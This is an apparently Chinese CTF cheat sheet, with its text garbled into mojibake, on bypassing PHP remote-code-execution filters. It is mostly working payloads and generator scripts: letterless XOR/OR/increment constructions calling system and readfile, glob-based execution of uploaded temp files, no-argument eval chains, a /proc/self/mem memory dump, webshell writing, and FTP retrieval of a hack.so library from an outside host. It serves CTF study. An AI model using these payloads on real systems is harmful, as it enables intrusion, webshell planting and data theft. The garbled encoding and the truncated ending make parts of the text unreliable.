(~%8C%86%8C%8B%9A%92)(~%93%8C) å¼‚æˆ–ï¼ˆ^ï¼‰ phpinfo() â†’ $_GET[x]&amp;x=phpinfo â†’ ${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}();&x=phpinfo system(&#39;ls&#39;) â†’ $_GET[x]($_GET[y])&amp;x=system&amp;y=ls â†’ ${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y});&x=system&y=ls æ— å­—æ¯æƒ…å½¢ï¼š phpinfo() â†’ (&#39;484880800&#39;^&#39;8.8-**)00&#39;^&#39;|~||||~()&#39;) system(&#39;ls&#39;) â†’ (&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;) æˆ–ï¼ˆ|ï¼‰ å¯ä»¥ç›´æ¥å°†éœ€è¦æ„é€ çš„å­—ç¬¦ä¸²ä¸åå¼•å·è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°çš„ç»“æœå†ä¸åå¼•å·ç›¸æˆ–å³å¯å¾—åˆ°åŸå­—ç¬¦ä¸²ã€‚ 123&lt;?phpecho &quot;````````&quot;^&quot;readfile&quot;;echo &quot;````&quot;^&quot;flag&quot;; payloadä¾‹ï¼šï¼ˆreadfile(&quot;/flag&quot;)ï¼‰ $code = &quot;(&#39;````````&#39;|&#39; &#39;)(&#39;/````&#39;|&#39;/ &#39;));//&quot;; å‚è€ƒï¼š https://blog.csdn.net/miuzzx/article/details/108569080 https://blog.csdn.net/miuzzx/article/details/109143413 æ„é€ ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/* author yu22x */$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123; for ($j=0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123; $hex_i=&#x27;0&#x27;.dechex($i); &#125; else&#123; $hex_i=dechex($i); &#125; if($j&lt;16)&#123; $hex_j=&#x27;0&#x27;.dechex($j); &#125; else&#123; $hex_j=dechex($j); &#125; $preg = &#x27;/[0-9a-z]/i&#x27;;//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯ if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123; echo &quot;&quot;; &#125; else&#123; $a=&#x27;%&#x27;.$hex_i; $b=&#x27;%&#x27;.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123; $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;; &#125; &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile); 1234567891011121314151617181920212223242526272829# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg): s1=&quot;&quot; s2=&quot;&quot; for i in arg: f=open(&quot;or_rce.txt&quot;,&quot;r&quot;) while True: t=f.readline() if t==&quot;&quot;: break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot; #åŒå¼•å·å¯æ¢å•å¼•å· return(output) while True: param=action(input(&quot;\\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot; print(param) ++è¿ç®—è‡ªå¢æ„é€  1234567891011121314&lt;?php$a=(_/_._)[0];//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡$o=++$a;//$o=++$aæ˜¯å…ˆæŠŠ$aè¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aå’Œ$oéƒ½æ˜¯O$o=++$a.$o;//$o=&gt;PO,$a=&gt;P$a++;//Q$a++;//R$o.=++$a;//$o=&gt;POS,$a=&gt;S$o.=++$a;//$o=&gt;POST,$a=&gt;T$_=_.$o;//_POST$$_[0]($$_[_]);//$_POST[0]($_POST[_]);//Payload://code=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=id//code=$_=(_/_._)[_];$_++;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);&amp;_POST=system&amp;_=id 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env python3#-*- coding:utf-8 -*-#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.comimport requestsfrom urllib.parse import quote_plusdef g(payload, buff): offset = 3 + buff res = &quot;&quot; base = 65 for i in range(len(payload)): if payload[i] == &#x27;_&#x27; or payload[i] == &#x27;/&#x27;: continue _ascii = ord(payload[i]) #init underline = &quot;$&quot; + (&quot;_&quot; * (i + offset)) undefined = &quot;$&quot; + (&quot;_&quot; * (len(payload) + offset + 15)) var = f&quot;++&#123;underline&#125;;$__-=&#123;underline&#125;;$__++;&#123;underline&#125;/=$__;&#123;underline&#125;=((&#123;undefined&#125;/&#123;undefined&#125;).&#123;underline&#125;)&quot;+r&quot;&#123;++$__&#125;;$__--;&quot; res += var; tmp = &#x27;&#x27; if _ascii &gt; base: for i in range(_ascii-base): tmp = tmp + f&quot;++&#123;underline&#125;;&quot; res += tmp first = &quot;$&quot; + (&quot;_&quot; * offset) for i in range(1, len(payload)): if payload[i] == &#x27;_&#x27;: res += f&quot;&#123;first&#125;.=&#x27;_&#x27;;&quot; continue if payload[i] == &#x27;/&#x27;: res += f&quot;&#123;first&#125;.=&#x27;/&#x27;;&quot; continue final_var = &quot;$&quot; + (&quot;_&quot; * (i + offset)) res += f&quot;&#123;first&#125;.=&#123;final_var&#125;;&quot; return [res, &quot;$&quot; + &quot;_&quot; * (offset)]pre = &quot;&#x27;&#x27;);&quot;after = &#x27;//&#x27;buff = len(&#x27;STRTOLOWERSHOW_SOURCE&#x27;)flag = g(&quot;/FLAG&quot;, buff)buff = len(&#x27;STRTOLOWER&#x27;)showsource = g(&quot;SHOW_SOURCE&quot;, buff)buff = 0strtolower = g(&#x27;STRTOLOWER&#x27;, buff)final = &#x27;&#x27;#1.æ„é€ STRTOLOWERå¹¶å­˜è¿›å˜é‡afinal += strtolower[0]a = strtolower[1] # a = &#x27;$___&#x27; # STRTOLOWER#2.æ„é€ SHOW_SOURCEå¹¶å­˜è¿›å˜é‡bfinal += showsource[0]b = showsource[1] # b = &#x27;$_____________&#x27; #SHOW_SOURCE#3.æ„é€ /FLAGå¹¶å­˜è¿›å˜é‡cfinal += flag[0] + flag[1] + &quot;=&#x27;/&#x27;.&quot; + flag[1] + &#x27;;&#x27;c = flag[1] # c = &#x27;$________________________&#x27; #/FLAG#å£°æ˜å¥½abcå˜é‡padding = f&#x27;$______________________________________________=&#123;a&#125;;$_______________________________________________=&#123;b&#125;;$________________________________________________=&#123;c&#125;;&#x27;final += padding# 4.å˜é‡d = a(c) åˆ™å˜é‡dä¸º/flagd = &quot;$______________________________________________($________________________________________________);&quot;padding = &#x27;$_________________________________________________=&#x27;+dfinal += padding#5. b(d) å³ä¸ºSHOW_SOURCE(&#x27;/flag&#x27;)final += &#x27;$_______________________________________________($_________________________________________________);&#x27;final = pre + finalfinal = final + afterprint(final.replace(&#x27;+&#x27;, &#x27;%2b&#x27;)) 12345678910111213141516171819202122232425262728293031323334#å…³é”®å­—æ„é€ #$_GET[0]($_GET[1]);need = &#x27;GET&#x27;alpha = list(set(need))alpha.sort()print(alpha)greece = &#x27;Î± Î² Î³ Î´ Îµ Î¶ Î½ Î¾ Î¿ Ï€ Ï Ïƒ Î· Î¸ Î¹ Îº Î» Î¼ Ï„ Ï… Ï† Ï‡ Ïˆ Ï‰ Î“ Î”&#x27;.split(&#x27; &#x27;)out = &#x27;$_=C;&#x27;cnt = ord(&#x27;C&#x27;)for k in alpha: if ord(k)-ord(&#x27;C&#x27;) in range(26): now_php = &#x27;&#x27; for i in range(ord(k)-cnt): now_php += &#x27;$_++;&#x27; cnt += 1 icon = greece[ord(k)-ord(&#x27;C&#x27;)] now_php += f&#x27;$&#123;icon&#125;=$_;&#x27; out += now_phpfunc = []for k in need: if ord(k)-ord(&#x27;C&#x27;) in range(26): icon = greece[ord(k)-ord(&#x27;C&#x27;)] func += [f&#x27;$&#123;icon&#125;&#x27;] else: func += [k]func = &#x27;.&#x27;.join(func)print(func)payload = f&#x27;&#123;out&#125;?&gt;&lt;?=($&#123;&#123;_.&#123;func&#125;&#125;&#125;[0])($&#123;&#123;_.&#123;func&#125;&#125;&#125;[1]);&#x27;print(payload) æ–‡ä»¶ä¸Šä¼ +æ‰§è¡Œ å‚è€ƒï¼š https://blog.csdn.net/qq_46091464/article/details/108513145 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯/tmp/phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚ æ‰§è¡Œ. /tmp/phpXXXXXXï¼Œä¹Ÿæ˜¯æœ‰å­—æ¯çš„ã€‚æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ°Linuxä¸‹çš„globé€šé…ç¬¦ï¼š *å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦ ?å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦ é‚£ä¹ˆï¼Œ/tmp/phpXXXXXXå°±å¯ä»¥è¡¨ç¤ºä¸º/*/?????????æˆ–/???/?????????ã€‚ ä½†æ˜¯ï¼Œåœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªåŒ¹é…ä¸Šçš„æ–‡ä»¶çš„æ—¶å€™å°±å·²ç»å‡ºç°äº†é”™è¯¯ï¼Œå¯¼è‡´æ•´ä¸ªæµç¨‹åœæ­¢ï¼Œæ ¹æœ¬ä¸ä¼šæ‰§è¡Œåˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚ globé€šé…ç¬¦æ”¯æŒç”¨[^x]çš„æ–¹æ³•æ¥æ„é€ â€œè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦xâ€ã€‚å¯ä»¥åˆ©ç”¨[@-[]æ¥è¡¨ç¤ºå¤§å†™å­—æ¯ã€‚å½“ç„¶ï¼Œphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚ POSTä¸Šä¼ æ–‡ä»¶æ•°æ®åŒ…ï¼š 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt; &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; åœ¨ä¸Šä¼ æ–‡ä»¶1.phpå†…å®¹æ·»åŠ shå‘½ä»¤ï¼š 12#!/bin/shls ä¸Šä¼ æŠ“åŒ…ï¼Œæ„é€ pocæ‰§è¡Œå‘½ä»¤ï¼š ?c=./???/????????[@-[] é€šé…ç¬¦ï¼ˆä»…æ— å­—æ¯ï¼‰ base64: /???/????64 ????.??? bzip2: /???/???/????2 ????.??? [~(å¼‚æˆ–)][!%FF]å½¢å¼ 123456789101112131415161718def one(s): ss = &quot;&quot; for each in s: ss += &quot;%&quot; + str(hex(255 - ord(each)))[2:].upper() return f&quot;[~&#123;ss&#125;][!%FF](&quot;&quot;&quot;&quot;ç»„æˆç±»ä¼¼äºsystem(pos(next(getallheaders())));å³å¯a=whoami&quot;&quot;&quot;while 1: a = input(&quot;:&gt;&quot;).strip(&quot;)&quot;) aa = a.split(&quot;(&quot;) s = &quot;&quot; for each in aa[:-1]: s += one(each) s += &quot;)&quot; * (len(aa) - 1) + &quot;;&quot; print(s) evalå‡½æ•°ä¸‹ å­—ç¬¦ä¸²æ‹¼æ¥ a=(s.y.s.t.e.m)(&#39;cat /flag&#39;); è¿›åˆ¶ç¼–ç  a=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;); å¼‚æˆ– a=(&#39;0000000&#39;^&#39;CICDU]&#39;)(&#39;cat /flag&#39;); a=(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;); å¥—å¨ƒ a=eval($_POST[1]);&amp;1=phpinfo(); çº¯æ•°å­—æ„é€ ï¼ˆLinuxç³»ç»Ÿçº§ï¼‰ 12345678910111213$(($&#123;_&#125;))#0$((~$(($&#123;_&#125;))))#-1$((~$(($((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))+$((~$(($&#123;_&#125;))))))))#36#å»+å·ä¹Ÿå¯$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))#36 #å»+å·ä¹Ÿå¯ å‚è€ƒï¼š CTFshow-RCEæé™å¤§æŒ‘æˆ˜ CTFshow-å‘¨æœ«å¤§æŒ‘æˆ˜ â€‹ æ— å‚æ•°/å¸¦å‚æ•°RCEæ— å‚å‡½æ•° phpinfo() phpversion() chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) -&gt; . chr(ord(hebrevc(crypt(phpversion())))) -&gt; . localeconv() è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.ã€‚ time() è¿”å›å½“å‰Unixæ—¶é—´æˆ³ã€‚ localtime() å–å¾—æœ¬åœ°æ—¶é—´ã€‚ getcwd() è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚ dirname() è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ getenv() è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼ˆåœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°ï¼‰ã€‚ getallheaders() è·å–å…¨éƒ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯ã€‚ï¼ˆApacheï¼‰ apache_request_headers() è·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯ï¼ŒåŒ…å«å½“å‰è¯·æ±‚æ‰€æœ‰å¤´ä¿¡æ¯çš„æ•°ç»„ï¼Œå¤±è´¥è¿”å› FALSEã€‚ï¼ˆApacheï¼‰ get_defined_vars() è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ã€‚ï¼ˆNginxï¼‰ get_defined_functions() è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å‡½æ•°æ‰€ç»„æˆçš„æ•°ç»„ã€‚ session_start() å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼Œå‘Šè¯‰PHPä½¿ç”¨sessionã€‚ï¼ˆPHPé»˜è®¤æ˜¯ä¸ä¸»åŠ¨ä½¿ç”¨sessionçš„ï¼Œé…åˆsession_id()ï¼‰ realpath_cache_get() è·å¾—çœŸå®è·¯å¾„ç¼“å­˜çš„è¯¦æƒ…ã€‚ get_class() è·å–å½“å‰è°ƒç”¨æ–¹æ³•çš„ç±»åã€‚ get_called_class() è·å–é™æ€ç»‘å®šåçš„ç±»åã€‚ ini_get_all() ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ•´ä¸ªphpçš„ç¯å¢ƒå˜é‡ï¼ˆé…ç½®ä¿¡æ¯ï¼‰ã€‚ __HALT_COMPILER() ä¸­æ–­ç¼–è¯‘å™¨çš„æ‰§è¡Œã€‚ï¼ˆä¸­æ–­phpçš„æ‰§è¡Œï¼Œä¸ä¼šæ£€æŸ¥åé¢çš„è¯­å¥ï¼‰ å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰ array_map() è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„æ•°ç»„ã€‚ array_map(&#39;system&#39;,[&#39;ls&#39;]); scandir() åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚ scandir(&#39;.&#39;) glob() è¿”å›åŒ¹é…æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶åæˆ–ç›®å½•ã€‚ print_r(glob(&quot;*&quot;)); print_r(glob(&quot;./*&quot;)[2]); current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚ current(localeconv()) â†’ . ?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo(); pos() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼Œcurrent()å‡½æ•°çš„åˆ«åã€‚ next() / prev() / reset() / end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½ / å€’å›ä¸€ä½ / æŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒ / æŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒã€‚ end(getallheaders()) + REQUEST-HEADER-last xx:yy = yy ï¼ˆé…åˆè‡ªå®šä¹‰è¯·æ±‚å¤´ç»•è¿‡å…³é”®å­—ï¼‰ assert() / eval() å‘½ä»¤æ‰§è¡Œã€‚ assert(phpinfo();); assert(assert($_POST[c])); chdir() æ”¹å˜ç›®å½•ã€‚ file_get_contents() highlight_file() / show_source() readfile() / readgzfile() echo() print_r() var_dump() dirname() è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ chr() ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ array_pop() å¼¹å‡ºå¹¶è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œå¹¶å°†æ•°ç»„çš„é•¿åº¦å‡ä¸€ã€‚ array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚ array_rand() è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœè§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ array_flip() ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚ array_slice() åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚ hex2bin() è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ session_id() è·å–åˆ°å½“å‰çš„session idã€‚ session_id(session_start()) create_function() åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaæ ·å¼ï¼‰ã€‚ä»£ç æ³¨å…¥ã€‚ hex2bin() æŠŠåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚ hex2bin(&#39;73797374656D&#39;) -&gt; system å‚è€ƒ https://www.cnblogs.com/wangtanzhi/p/12311239.html â€‹ åˆ—ç›®å½• SPLç›®å½•ç±»ï¼šDirectoryIterator 1234567&lt;?php//å¯ç”¨äºçŒœè§£æ–‡ä»¶å$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123; echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;?&gt; SPLç›®å½•ç±»ï¼šFilesystemIterator 123&lt;?phpecho new FilesystemIterator(getcwd());?&gt; SPLç›®å½•ç±»ï¼šGlobIterator å¯é€šé…ä¾‹å¦‚/var/html/www/flag* scandir() é¢å‘è¿‡ç¨‹æ–¹æ³•ï¼šopendir()ï¼Œreaddir()ï¼Œclosedir() é¢å‘å¯¹è±¡æ–¹æ³•ï¼šPHPçš„dirç±» â€‹ è¯»æ–‡ä»¶ ç‰¹æ®Šæ–‡ä»¶ï¼š /proc/self/cmdline - åº”ç”¨è¿è¡Œçš„æ–‡ä»¶å¤¹ /proc/self/environï¼ˆ/proc/1/environï¼‰ - å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼›å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚é‡è¦çš„å±æ€§ï¼Œæ¯”å¦‚WEBæœåŠ¡çš„æƒé™ /proc/self/cwd - å½“å‰ç›®å½• /proc/[PID]/fd/[NUM] - æ˜¯ä¸ªç›®å½•ï¼ŒåŒ…å«å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ /proc/self/maps + /proc/self/mem æ–‡ä»¶è¯»å–éƒ¨åˆ†å¦‚å¯ä»¥seekè¯»å–ï¼Œç¬¬ä¸€æ­¥é€šè¿‡ /proc/self/maps è¯»å–å †æ ˆåˆ†å¸ƒï¼Œå†è¯»å– /proc/self/mem çš„å†…å­˜æ•°æ®ï¼Œå†é€šè¿‡æ­£åˆ™ç­›é€‰ç¬¦åˆæ ¼å¼çš„æ•°æ®ã€‚ 123456789101112131415import requests, reurl = &quot;&quot;maps_url = f&quot;&#123;url&#125;?file=/proc/self/maps&quot;maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;maps = re.findall(maps_reg, requests.get(maps_url).text)# print(maps)for m in maps: start, end = m.split(&quot;-&quot;)[0], m.split(&quot;-&quot;)[1] Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16)) read_url = f&quot;&#123;url&#125;?file=/proc/self/mem&amp;offset=&#123;Offset&#125;&amp;length=&#123;Length&#125;&quot; s = requests.get(read_url).content rt = re.findall(b&quot;[a-z0-9]&#123;8&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;12&#125;&quot;, s) if rt: print(rt) file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file()) fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv() 123456$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3ç‰ˆæœ¬å è¯¥å‡½æ•°å·²ä¸å†è¢«ä½¿ç”¨$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;); $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125; $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125; $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125; include() / require() é€‚ç”¨éphpæ–‡ä»¶ SPLæ–‡ä»¶ç±»ï¼šSplFileObject æŒ‰è¡Œè¯»å–ï¼Œå¤šè¡Œéœ€è¦éå†ã€‚é€‚é…ä¼ªåè®®ï¼Œå¦‚ php://filterã€‚ Mysql 123456789101112131415161718&lt;?php$conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);if ($conn-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥: &quot; . $conn-&gt;connect_error);&#125; $sql = &quot;SELECT LOAD_FILE(&#x27;/flag.txt&#x27;) as my&quot;;$result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo $row[&quot;my&quot;]; &#125;&#125; else &#123; echo &quot;0 ç»“æœ&quot;;&#125;$conn-&gt;close();?&gt; â€‹ å†™æ–‡ä»¶ file_put_contents() SplFileObject::fwrite() 1234567891011121314define(&quot;EV&quot;, &quot;eva&quot;.&quot;l&quot;);define(&quot;GETCONT&quot;, &quot;fil&quot;.&quot;e_get_contents&quot;);// ç”±äºç¦æ­¢äº†$ï¼Œä»å·²æœ‰çš„åœ°æ–¹è·å–$ç¬¦define(&quot;D&quot;,(GETCONT)(&#x27;/var/www/html/index.php&#x27;)[353]);define(&quot;SHELL&quot;,&quot;&lt;?php &quot;.EV.&quot;(&quot;.D.&quot;_POST[&#x27;a&#x27;]);&quot;);echo (GETCONT)(&#x27;./shell.php&#x27;);class splf extends SplFileObject &#123; public function __destruct() &#123; parent::fwrite(SHELL); &#125;&#125;define(&quot;PHARA&quot;, new splf(&#x27;shell.php&#x27;,&#x27;w&#x27;)); FTP Pythonå¼€å¯FTPæœåŠ¡ 123456789101112131415from pyftpdlib.authorizers import DummyAuthorizerfrom pyftpdlib.handlers import FTPHandlerfrom pyftpdlib.servers import FTPServerauthorizer = DummyAuthorizer()authorizer.add_anonymous(&quot;./&quot;)handler = FTPHandlerhandler.authorizer = authorizerhandler.masquerade_address = &quot;ip&quot;# æ³¨æ„è¦ç”¨è¢«åŠ¨æ¨¡å¼handler.passive_ports = range(9998,10000)server = FTPServer((&quot;0.0.0.0&quot;, 23), handler)server.serve_forever() PHPä¸‹è½½ 123456789101112131415161718$local_file = &#x27;/tmp/hack1.so&#x27;;$server_file = &#x27;hack.so&#x27;;$ftp_server = &#x27;xxxxx&#x27;;$ftp_port=21;$ftp = ftp_connect($ftp_server,$ftp_port);$login_result = ftp_login($ftp, &#x27;anonymous&#x27;, &#x27;&#x27;);// æ³¨æ„è¦å¼€å¯è¢«åŠ¨æ¨¡å¼ftp_pasv($ftp,1);if (ftp_get($ftp, 